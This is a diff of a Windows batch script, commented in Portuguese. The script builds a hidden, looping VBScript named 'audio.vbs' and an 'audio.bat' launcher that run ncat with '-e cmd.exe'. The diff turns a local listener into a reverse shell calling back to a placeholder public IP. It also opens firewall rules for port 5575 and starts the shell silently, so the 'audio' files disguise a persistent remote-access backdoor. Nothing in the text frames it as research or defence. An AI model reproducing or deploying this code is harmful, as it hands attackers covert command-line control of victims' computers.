@@ -22,7 +22,7 @@ set "PATH=%PATH%;%ProgramFiles(x86)%\Nmap"
 
 :: Criar audio.vbs
 echo Do > "%USERPROFILE%\Downloads\audio.vbs"
-echo CreateObject("Wscript.Shell").Run "ncat -lnp 5575 -e cmd.exe", 0, True >> "%USERPROFILE%\Downloads\audio.vbs"
+echo CreateObject("Wscript.Shell").Run "ncat SEU_IP_PUBLICO 5575 -e cmd.exe", 0, True >> "%USERPROFILE%\Downloads\audio.vbs"
 echo Loop >> "%USERPROFILE%\Downloads\audio.vbs"
 
 :: Criar audio.bat
@@ -31,8 +31,8 @@ echo start "" /B wscript.exe //nologo "%USERPROFILE%\Downloads\audio.vbs" >> "%U
 echo exit >> "%USERPROFILE%\Downloads\audio.bat"
 
 :: Liberar o ranger de portas 5575-5580 na entrada e saida
-netsh advfirewall firewall add rule name="Abrir Portas Entrada 5575-5580" dir=in action=allow protocol=TCP localport=5575-5580
-netsh advfirewall firewall add rule name="Abrir Portas Saida 5575-5580" dir=out action=allow protocol=TCP localport=5575-5580
+netsh advfirewall firewall add rule name="Abrir Portas Entrada 5575" dir=in action=allow protocol=TCP localport=5575
+netsh advfirewall firewall add rule name="Abrir Portas Saida 5575" dir=out action=allow protocol=TCP localport=5575
 
 :: Iniciar listener
 start "" /B wscript.exe //nologo "%USERPROFILE%\Downloads\audio.vbs"
